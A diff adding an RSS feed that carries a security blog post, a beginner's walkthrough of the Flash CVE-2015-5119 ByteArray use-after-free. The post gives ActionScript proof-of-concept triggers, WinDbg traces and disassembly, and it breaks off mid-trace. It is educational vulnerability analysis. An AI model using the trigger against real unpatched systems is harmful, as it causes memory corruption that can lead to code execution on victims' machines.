@@ -1,0 +1,1657 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; MTB</title>
+	<atom:link href="https://labs.portcullis.co.uk/author/mtb/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>CVE-2015-5119 Flash ByteArray UaF: A beginner&#8217;s walkthrough</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/#comments</comments>
+		<pubDate>Thu, 24 Sep 2015 14:26:26 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2015-5119]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[Flash]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5270</guid>
+		<description><![CDATA[<p>This document is a written form of a workshop and presentation I gave at Portcullis Labs in late July 2015. It is a beginner&#8217;s walkthrough to understand the recent Flash bug that was discovered in Hacking Team&#8217;s pocket and given the sweet name of CVE-2015-5119. It was found and exploited by Vitaliy Toropov. Disclaimer: If [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/">CVE-2015-5119 Flash ByteArray UaF: A beginner&#8217;s walkthrough</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This document is a written form of a workshop and presentation I gave at <a title="Portcullis Labs" href="https://labs.portcullis.co.uk/">Portcullis Labs</a> in late July 2015. It is a beginner&#8217;s walkthrough to understand the recent Flash bug that was discovered in Hacking Team&#8217;s pocket and given the sweet name of CVE-2015-5119. It was found and exploited by Vitaliy Toropov.<span id="more-5270"></span></p>
+<p>Disclaimer: If you are already a confirmed reverse engineer xor a debugging ninja, this document is not for you, go hack something else :-).</p>
+<p>As a beginner software bug analysis is not a very easy task. It requires a fair amount of experience that you can only get with motivation, time, perseverance and someone to kick your but when you start to be discouraged. One may find easier to work on example codes, made-up proof of concept and other challenges. This is true as it surely helps to quickly understand some concepts but if you are willing to spend some time I suggest you&#8217;d rather work on real bugs. This way you will dive into one specific software product, you will start to understand its internals and eventually find your own bugs. Also, you will get that extra little feeling of compl33tness and the beloved one will eventually come back.</p>
+<p>In this article we will first start to reverse engineer the function that crashes. We will then dig around it to understand the circumstances of the crash. This will be done by recreating step by step the different pieces needed to produce the final proof of concept. Lastly, we will finish by identifying where the allocation and the freeing of the faulty memory block is performed.</p>
+<h2>Prerequisites</h2>
+<p>You first need to download a vulnerable version of Flash. I suggest to use Flash player rather than the plugin version. It is much easier to debug. Try to find version 18_0.0.160 if you want to match my binary analysis. Additionally you can download or browse the AVM+ <a title="avnplus source code" href="https://github.com/adobe-flash/avmplus">avmplus source code</a>.</p>
+<p>Obviously you need a debugger. Pick up the one of your choice, there are plenty of excellent free ones: <a title="Windbg" href="https://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx">Windbg</a>, <a title="Ollydbg2" href="http://www.ollydbg.de/version2.html">Ollydbg2</a>, <a title="ImmunityDbg" href="http://debugger.immunityinc.com/">ImmunityDbg</a>, <a title="x64dbg" href="http://x64dbg.com/#start">x64dbg</a>. My assembly samples have been produced with <a title="IDA Pro" href="https://www.hex-rays.com/products/ida/">IDA Pro</a>. Only using a debugger is enough and you don&#8217;t really need a disassember but you can always try the demonstration version of <a title="IDA Pro" href="https://www.hex-rays.com/products/ida/">IDA Pro</a> or <a title="Hopper" href="http://www.hopperapp.com/">Hopper</a> on Unix.</p>
+<p>In addition, download <a title="the walkthrough sample archive" href="https://github.com/portcullislabs/CVE-2015-5119_walkthrough">the walkthrough sample archive</a>.</p>
+<p>Lastly a fair knowledge of x86 assembly and object programming is desired. Grab a good cup of <a title="Evil product placement" href="http://www.palaisdesthes.com/en/jukro.html">excellent</a> tea. Or coffee if you are one of those.</p>
+<h2>The crash</h2>
+<p>Enough of the boring verbiage, let&#8217;s start. Observe the following Flash Action Script code.</p>
+<pre class="brush: cpp; title: ; notranslate">
+ba = new ByteArray();
+ba.length = 0x01000000;
+
+o = new Object();
+o.valueOf = function()
+{
+    ba.clear();
+    return 0x41414141;
+}
+
+ba[0x42424242] = o
+</pre>
+<p>At first you can see that a new <a title="ByteArray=" href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/utils/ByteArray.html">Byte Array</a> is being initialised with the size of 0&#215;01000000 bytes. There is a reason why the size is this big and we will get to it later. Right after a new object is created and its valueOf method is being overloaded with some custom code. The object is then assigned in the byte array object at offset 0&#215;42424242.</p>
+<p>Open Flash player and open the 0_poc.swf sample file. Attach your debugger. I will use Windbg for this paper but use the one of your choice. Then click on the Trigger button and observe the following crash.</p>
+<p>Output from Windbg:</p>
+<pre class="brush: asm; gutter: false; highlight: [8]; title: ; notranslate">
+(7ec.e28): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=045acfa9 ecx=0458de07 edx=00000007 esi=49d94242 edi=01163810
+eip=01898e8d esp=0015e71c ebp=0015e790 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98ad:
+01898e8d 8806            mov     byte ptr [esi],al          ds:002b:49d94242=??
+</pre>
+<p>As you can see, Flash is trying to assign a byte at ESI at a memory location that is not mapped in memory. The value of EAX is 0&#215;41414141.</p>
+<p>If you want to use a disassembler, jump to the faulting instruction. Beware of <a title="ASLR" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">address space layout randomization</a> (ASLR). You need to compute the correct address. This is easily done by subtracting the desired address with the start address of the loaded module and then add the base address of the module. You can get the start address with Windbg using the following command:</p>
+<pre class="brush: asm; gutter: false; highlight: [1]; title: ; notranslate">
+0:000&gt; lm m flashplayer_18_0_0_160
+start    end        module name
+012a0000 01fd3000   flashplayer_18_0_0_160   (export symbols)       C:\Users\user\Desktop\Flash\flashplayer_18_0.0.160.exe
+</pre>
+<p>You can get the base address of the module from IDA Pro running the following Python command:</p>
+<pre class="brush: python; gutter: false; highlight: [1]; title: ; notranslate">
+Python&gt;hex(idaapi.get_imagebase())
+0x400000
+</pre>
+<p>Jump at 0x009f8e8d (0x01898e8d &#8211; 0x012a0000 + 0&#215;400000) and observe the following function.</p>
+<pre class="brush: asm; gutter: false; highlight: [16]; title: ; notranslate">
+.text:009F8E70 sub_9F8E70      proc near
+.text:009F8E70
+.text:009F8E70 arg_0           = dword ptr  4
+.text:009F8E70 arg_4           = dword ptr  8
+.text:009F8E70
+.text:009F8E70                 mov     eax, [esp+arg_0]
+.text:009F8E74                 push    esi
+.text:009F8E75                 push    eax
+.text:009F8E76                 add     ecx, 18h
+.text:009F8E79                 call    sub_9F8AF0
+.text:009F8E7E                 mov     ecx, [esp+4+arg_4]
+.text:009F8E82                 push    ecx
+.text:009F8E83                 mov     esi, eax
+.text:009F8E85                 call    sub_9E0170
+.text:009F8E8A                 add     esp, 4
+.text:009F8E8D                 mov     [esi], al              ; Crashes here.
+.text:009F8E8F                 pop     esi
+.text:009F8E90                 retn    8
+.text:009F8E90 sub_9F8E70      endp
+</pre>
+<p>The function takes two arguments. Then two functions are called. The first argument of the sub_9F8AF0() function is the same argument as the sub_9F8E70() function. The returned value is saved in the ESI register, remember, where the crash occurs. The value being saved is the return value of the second function. The argument of the second function sub_9E0170() is the second argument of the sub_9F8E70() function.</p>
+<p>Let&#8217;s restart Flash and break in sub_9F8E70(): start address + 0x09F8E70 &#8211; 0&#215;400000.</p>
+<pre class="brush: asm; gutter: false; highlight: [10]; title: ; notranslate">
+0:007&gt; ba e1 flashplayer_18_0_0_160+0x5f8e70
+0:007&gt; g
+SetContext failed, 0x80070005
+MachineInfo::SetContext failed - Thread: 001ABAE0  Handle: 2cc  Id: 27c - Error == 0x80070005
+Breakpoint 0 hit
+eax=42424242 ebx=038e03f9 ecx=038e03f8 edx=01908e70 esi=045c42f8 edi=00fc3810
+eip=01908e70 esp=0041eb20 ebp=0041eb90 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c9890:
+01908e70 8b442404        mov     eax,dword ptr [esp+4] ss:002b:0041eb24=42424242
+</pre>
+<p>The first argument is 0&#215;42424242. Remember the Action Script code, this is our byte array index. Let&#8217;s step now until the first function returns.</p>
+<pre class="brush: asm; gutter: false; highlight: [6,11]; title: ; notranslate">
+0:000&gt; p
+SetContext failed, 0x80070005
+MachineInfo::SetContext failed - Thread: 001ABE40  Handle: 3c0  Id: 114c - Error == 0x80070005
+SetContext failed, 0x80070005
+MachineInfo::SetContext failed - Thread: 001ABAE0  Handle: 2cc  Id: fac - Error == 0x80070005
+eax=49d94242 ebx=038e03f9 ecx=038e0434 edx=00000000 esi=045c42f8 edi=00fc3810
+eip=01908e7e esp=0041eb1c ebp=0041eb90 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c989e:
+01908e7e 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:0041eb28=e97f6304
+0:000&gt; dd eax
+49d94242  00000000 00000000 00000000 00000000
+49d94252  00000000 00000000 00000000 00000000
+49d94262  00000000 00000000 00000000 00000000
+49d94272  00000000 00000000 00000000 00000000
+49d94282  00000000 00000000 00000000 00000000
+49d94292  00000000 00000000 00000000 00000000
+49d942a2  00000000 00000000 00000000 00000000
+49d942b2  00000000 00000000 00000000 00000000
+</pre>
+<p>The function returns a pointer and we can see the address pointed is mapped. Let&#8217;s see what the second function returns.</p>
+<pre class="brush: asm; gutter: false; highlight: [7,10]; title: ; notranslate">
+0:000&gt; p
+eax=49d94242 ebx=038e03f9 ecx=04637fe9 edx=00000000 esi=49d94242 edi=00fc3810
+eip=01908e85 esp=0041eb18 ebp=0041eb90 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98a5:
+01908e85 e8e672feff      call    flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b90 (018f0170)
+0:000&gt; dd 04637fe9 L4
+04637fe9  0201c03d 60000000 000449f1 f9044854
+0:000&gt; p
+eax=41414141 ebx=038e03f9 ecx=00eacf07 edx=00000007 esi=49d94242 edi=00fc3810
+eip=01908e8a esp=0041eb18 ebp=0041eb90 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98aa:
+01908e8a 83c404          add     esp,4
+</pre>
+<p>The first argument of the sub_9E0170() function is being saved in the ECX register. It seems to be a pointer. The return value of the function is 0&#215;41414141. Remember again, the returned value of the overloaded valueOf method.</p>
+<p>Stepping until the instruction that crashes shows that the memory address 0x49d94242 is not mapped anymore.</p>
+<pre class="brush: asm; gutter: false; highlight: [2,7]; title: ; notranslate">
+0:000&gt; p
+eax=41414141 ebx=038e03f9 ecx=00eacf07 edx=00000007 esi=49d94242 edi=00fc3810
+eip=01908e8d esp=0041eb1c ebp=0041eb90 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98ad:
+01908e8d 8806            mov     byte ptr [esi],al          ds:002b:49d94242=??
+0:000&gt; dd esi
+49d94242  ???????? ???????? ???????? ????????
+49d94252  ???????? ???????? ???????? ????????
+49d94262  ???????? ???????? ???????? ????????
+49d94272  ???????? ???????? ???????? ????????
+49d94282  ???????? ???????? ???????? ????????
+49d94292  ???????? ???????? ???????? ????????
+49d942a2  ???????? ???????? ???????? ????????
+49d942b2  ???????? ???????? ???????? ????????
+</pre>
+<p>The devil is in the sub_9E0170() function.</p>
+<h2>Understanding AvmCore::integer</h2>
+<p>It is clear now that the function that crashes is the one responsible for assigning a byte to an element of the array.  We usually never really need the source code when debugging a crash but it surely ease the work. A quick look at the <a title="ByteArray.c" href="https://github.com/adobe-flash/avmplus/blob/master/core/ByteArrayGlue.cpp">ByteArray</a> source code gives us the function symbols:</p>
+<pre class="brush: cpp; title: ; notranslate">
+void ByteArrayObject::setUintProperty(uint32_t i, Atom value)
+{
+    m_byteArray[i] = uint8_t(AvmCore::integer(value));
+}
+</pre>
+<p>We can set ourselves the symbols in the disassembler.</p>
+<pre class="brush: asm; gutter: false; highlight: [10,14,16]; title: ; notranslate">
+.text:009F8E70 ByteArrayObject__setUintProperty proc near
+.text:009F8E70
+.text:009F8E70 index           = dword ptr  4
+.text:009F8E70 atom            = dword ptr  8
+.text:009F8E70
+.text:009F8E70                 mov     eax, [esp+index]           ; The index in the array
+.text:009F8E74                 push    esi
+.text:009F8E75                 push    eax
+.text:009F8E76                 add     ecx, 18h
+.text:009F8E79                 call    ByteArray_operator_bracket ; Return the memory address of array+index.
+.text:009F8E7E                 mov     ecx, [esp+4+atom]
+.text:009F8E82                 push    ecx
+.text:009F8E83                 mov     esi, eax
+.text:009F8E85                 call    AvmCore_integer
+.text:009F8E8A                 add     esp, 4
+.text:009F8E8D                 mov     [esi], al                  ; Set the byte at array+index.
+.text:009F8E8F                 pop     esi
+.text:009F8E90                 retn    8
+.text:009F8E90 ByteArrayObject__setUintProperty endp
+</pre>
+<p>The way the ByteArray_operator_bracket() function works is not needed here. The fun is happening in the AvmCore_integer() function. The source code of this function can be found <a title="here" href="https://github.com/adobe-flash/avmplus/blob/master/core/AvmCore.cpp">here</a>. I have populated the disassembler with the new known symbols.</p>
+<pre class="brush: asm; gutter: false; highlight: [10,14,21]; title: ; notranslate">
+.text:009E0170 AvmCore_integer proc near
+.text:009E0170
+.text:009E0170
+.text:009E0170 var_8           = qword ptr -8
+.text:009E0170 atom            = dword ptr  4
+.text:009E0170
+.text:009E0170                 mov     eax, [esp+atom]
+.text:009E0174                 mov     ecx, eax
+.text:009E0176                 and     ecx, 7
+.text:009E0179                 cmp     ecx, 6                       ; Check the atom's kind.
+.text:009E017C                 jnz     short convert_the_object
+.text:009E017E
+.text:009E017E return_the_value:
+.text:009E017E                 sar     eax, 3
+.text:009E0181                 retn
+.text:009E0182
+.text:009E0182 convert_the_object:
+.text:009E0182                 cmp     ecx, 5
+.text:009E0185                 jz      short return_the_value
+.text:009E0187                 push    eax
+.text:009E0188                 call    number
+.text:009E018D                 push    ecx
+.text:009E018E                 fstp    [esp+8+var_8]
+.text:009E0191                 call    integer_d
+.text:009E0196                 add     esp, 8
+.text:009E0199                 retn
+.text:009E0199 AvmCore_integer endp
+</pre>
+<p>The argument of this function is an atom. If the object is an integer, its value is returned. Otherwise the number() function is called on the atom.</p>
+<p>Let&#8217;s verify this by seeing how the following ActionScript is being executed:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">
+ba = new ByteArray();
+ba.length = 0x01000000;
+
+ba[0] = 0x41;
+</pre>
+<p>Open the 1_simplebyte.swf with Flash player, attach your debugger, set your breakpoints and break at the AvmCore_integer() function.</p>
+<pre class="brush: asm; gutter: false; highlight: [14]; title: ; notranslate">
+eax=068a0000 ebx=0109ecb0 ecx=039e9434 edx=00748e70 esi=03b132f8 edi=039e93f8
+eip=00748e7e esp=0109eb9c ebp=0109ec10 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c989e:
+00748e7e 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:0109eba8=0e020000
+0:000&gt;
+
+...
+
+eax=0000020e ebx=0109ecb0 ecx=00000006 edx=00748e70 esi=068a0000 edi=039e93f8
+eip=00730179 esp=0109eb94 ebp=0109ec10 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b99:
+00730179 83f906          cmp     ecx,6
+</pre>
+<p>The atom&#8217;s kind is indeed an integer.</p>
+<pre class="brush: asm; gutter: false; highlight: [5]; title: ; notranslate">
+eax=0000020e ebx=0109ecb0 ecx=00000006 edx=00748e70 esi=068a0000 edi=039e93f8
+eip=0073017e esp=0109eb94 ebp=0109ec10 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b9e:
+0073017e c1f803          sar     eax,3
+0:000&gt; p
+eax=00000041 ebx=0109ecb0 ecx=00000006 edx=00748e70 esi=068a0000 edi=039e93f8
+eip=00730181 esp=0109eb94 ebp=0109ec10 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0ba1:
+00730181 c3              ret
+</pre>
+<p>and the value 0&#215;41 is being returned. But what happens if the atom is not an integer but a simple object.</p>
+<p>Let&#8217;s use the following code:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">
+ba = new ByteArray();
+ba.length = 0x01000000;
+
+ba[0] = 0x41;
+ba[1] = new Object();
+</pre>
+<p>Open the 2_simpleobject.swf and break at the second call to AvmCore_integer() where the object is being assigned.</p>
+<pre class="brush: asm; gutter: false; highlight: [13,21]; title: ; notranslate">
+eax=07da0001 ebx=07a7ba29 ecx=07a42fe9 edx=00748e70 esi=07da0001 edi=03a59810
+eip=00730170 esp=0109eb94 ebp=0109ec10 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b90:
+00730170 8b442404        mov     eax,dword ptr [esp+4] ss:002b:0109eb98=e92fa407
+
+...
+
+eax=07a42fe9 ebx=07a7ba29 ecx=00000001 edx=00748e70 esi=07da0001 edi=03a59810
+eip=00730179 esp=0109eb94 ebp=0109ec10 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b99:
+00730179 83f906          cmp     ecx,6
+
+...
+
+eax=07a42fe9 ebx=07a7ba29 ecx=00000001 edx=00748e70 esi=07da0001 edi=03a59810
+eip=00730188 esp=0109eb90 ebp=0109ec10 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0ba8:
+00730188 e8f3e1ffff      call    flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aeda0 (0072e380)
+</pre>
+<p>As expected that atom&#8217;s kind is not an integer so the number() function is being called.</p>
+<p>The number() function is mainly a loop with a switch inside.</p>
+<pre class="brush: asm; gutter: false; highlight: [8,13]; title: ; notranslate">
+.text:009DE380 number          proc near
+.text:009DE380
+.text:009DE380 atom            = dword ptr  4
+.text:009DE380
+.text:009DE380                 mov     eax, [esp+atom]
+.text:009DE384                 mov     edx, eax
+.text:009DE386                 and     edx, 7
+.text:009DE389                 cmp     edx, 6                  ; Is it already a number?
+.text:009DE38C                 jz      short return_the_value
+
+...
+
+.text:009DE3A2                 jmp     ds:off_9DE3FC[ecx*4]    ; Switch jump
+</pre>
+<p>If the object is already a number, its value is simply returned. Otherwise a 5 case plus default switch is encountered. Because our atom is of kind kObjectType, jump case 1 is used:</p>
+<pre class="brush: asm; gutter: false; highlight: [2,6]; title: ; notranslate">
+.text:009DE3B7 loc_9DE3B7:
+.text:009DE3B7                 and     eax, 0FFFFFFF8h ; jumptable 009DE3A2 case 1
+.text:009DE3BA                 mov     edx, [eax]
+.text:009DE3BC                 mov     ecx, eax
+.text:009DE3BE                 mov     eax, [edx+4Ch]
+.text:009DE3C1                 call    eax             ; AvmCore::atomToScriptObject(atom)-&gt;defaultValue()
+</pre>
+<p>This can be verified from the debugger.</p>
+<pre class="brush: asm; gutter: false; highlight: [5,13,15]; title: ; notranslate">
+eax=07a42fe9 ebx=07a7ba29 ecx=00000000 edx=00000001 esi=07da0001 edi=03a59810
+eip=0072e3a2 esp=0109eb8c ebp=0109ec10 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aedc2:
+0072e3a2 ff248dfce37200  jmp     dword ptr flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aee1c (0072e3fc)[ecx*4] ds:002b:0072e3fc=b7e37200
+
+...
+
+eax=0074ab30 ebx=07a7ba29 ecx=07a42fe8 edx=00a43de0 esi=07da0001 edi=03a59810
+eip=0072e3c1 esp=0109eb8c ebp=0109ec10 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aede1:
+0072e3c1 ffd0            call    eax {flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1cb550 (0074ab30)}
+0:000&gt; p
+eax=07a42fa2 ebx=07a7ba29 ecx=07a42f02 edx=02f65000 esi=07da0001 edi=03a59810
+eip=0072e3c3 esp=0109eb8c ebp=0109ec10 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aede3:
+0072e3c3 8bd0            mov     edx,eax
+</pre>
+<p>This function returns an object and we loop once more if the returned object is not a number as seen below:</p>
+<pre class="brush: asm; gutter: false; highlight: [5,11]; title: ; notranslate">
+eax=07a42fa2 ebx=07a7ba29 ecx=07a42f02 edx=00000002 esi=07da0001 edi=03a59810
+eip=0072e3c8 esp=0109eb8c ebp=0109ec10 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aede8:
+0072e3c8 83fa06          cmp     edx,6
+0:000&gt; t
+eax=07a42fa2 ebx=07a7ba29 ecx=07a42f02 edx=00000002 esi=07da0001 edi=03a59810
+eip=0072e3cb esp=0109eb8c ebp=0109ec10 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aedeb:
+0072e3cb 75c3            jne     flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aedb0 (0072e390) [br=1]
+</pre>
+<p>Ultimately zero is returned.</p>
+<p>Now let&#8217;s consider the following piece of code:</p>
+<pre class="brush: cpp; gutter: false; highlight: [9]; title: ; notranslate">
+ba = new ByteArray();
+ba.length = 0x01000000;
+
+ba[0] = 0x41;
+o = new Object();
+
+o.valueOf = function()
+{
+    return 0x42;
+}
+
+ba[1] = o;
+</pre>
+<p>We have now overloaded the valueOf() method with an ActionScript function to make it to return 0&#215;42. Open the 3_object_withvalueOf.swf file and break at the second call to the number() function. Step through until the call to the AvmCore::atomToScriptObject(atom)-&gt;defaultValue() function.</p>
+<pre class="brush: asm; gutter: false; highlight: [5,7,19]; title: ; notranslate">
+eax=014aab30 ebx=0393d3f9 ecx=031a94f0 edx=017a3de0 esi=06860001 edi=03124810
+eip=0148e3c1 esp=0035eb4c ebp=0035ebd0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aede1:
+0148e3c1 ffd0            call    eax {flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1cb550 (014aab30)}
+0:000&gt; p
+eax=00000216 ebx=0393d3f9 ecx=00000206 edx=00280000 esi=06860001 edi=03124810
+eip=0148e3c3 esp=0035eb4c ebp=0035ebd0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aede3:
+0148e3c3 8bd0            mov     edx,eax
+
+...
+
+eax=00000216 ebx=0393d3f9 ecx=00000206 edx=00000006 esi=06860001 edi=03124810
+eip=0148e3cd esp=0035eb4c ebp=0035ebd0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aeded:
+0148e3cd c1f803          sar     eax,3
+0:000&gt; t
+eax=00000042 ebx=0393d3f9 ecx=00000206 edx=00000006 esi=06860001 edi=03124810
+eip=0148e3d0 esp=0035eb4c ebp=0035ebd0 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1aedf0:
+0148e3d0 89442404        mov     dword ptr [esp+4],eax ss:002b:0035eb50=f1941a03
+</pre>
+<p>You can observe that the returned object is now an integer of value 0&#215;42 as expected.</p>
+<h2>Allocation of the byte array.</h2>
+<p>Remember the byte array being initialised with a size of 0&#215;01000000 bytes? The reason is that the VirtualAlloc() function is going to make the allocation and not the custom allocator for the purposes of a proof of concept. Fire up again the 0_poc.swf file and set a break point at VirtuallAlloc().</p>
+<pre class="brush: asm; gutter: false; title: ; notranslate">
+0:007&gt; bp kernel32!VirtualAlloc
+*** Unable to resolve unqualified symbol in Bp expression 'fastMalloc'.
+0:007&gt; ba e1 flashplayer_18_0_0_160+0x5f8e70
+0:007&gt; g
+</pre>
+<p>Click on the Trigger button and wait for the breakpoint to be hit.</p>
+<pre class="brush: asm; gutter: false; highlight: [7,9,15]; title: ; notranslate">
+Breakpoint 0 hit
+eax=01000000 ebx=01000000 ecx=00000000 edx=00000000 esi=00d90058 edi=00001000
+eip=74d8182f esp=0021e868 ebp=0021e8da iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+kernel32!VirtualAlloc:
+*** Unable to resolve unqualified symbol in Bp expression 'fastMalloc'.
+74d8182f ff250809d874    jmp     dword ptr [kernel32!_imp__VirtualAlloc (74d80908)] ds:002b:74d80908={KERNELBASE!VirtualAlloc (7548f002)}
+0:000&gt; t
+eax=01000000 ebx=01000000 ecx=00000000 edx=00000000 esi=00d90058 edi=00001000
+eip=7548f002 esp=0021e868 ebp=0021e8da iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+KERNELBASE!VirtualAlloc:
+7548f002 8bff            mov     edi,edi
+0:000&gt; gu
+eax=06900000 ebx=01000000 ecx=150a0000 edx=000adfb8 esi=00d90058 edi=00001000
+eip=008af347 esp=0021e87c ebp=0021e8da iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x13fd67:
+008af347 c3              ret
+</pre>
+<p>As you can see a block of 0&#215;01000000 bytes is being allocated. Observe the allocation is done twice. The reason is that the block is not committed in the first call but both calls return the same address.</p>
+<p>Now just add a new breakpoint on the AvmCore_Integer() function. Step over the ByteArray_operator_bracket() function. A new allocation is made.</p>
+<pre class="brush: asm; gutter: false; highlight: [6,9,12,14,20]; title: ; notranslate">
+0:000&gt; ba e1 flashplayer_18_0_0_160+0x5f8e85
+eax=42424242 ebx=04370ef9 ecx=04370f10 edx=01238e70 esi=044642f8 edi=03223810
+eip=01238e79 esp=002fe898 ebp=002fe910 iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c9899:
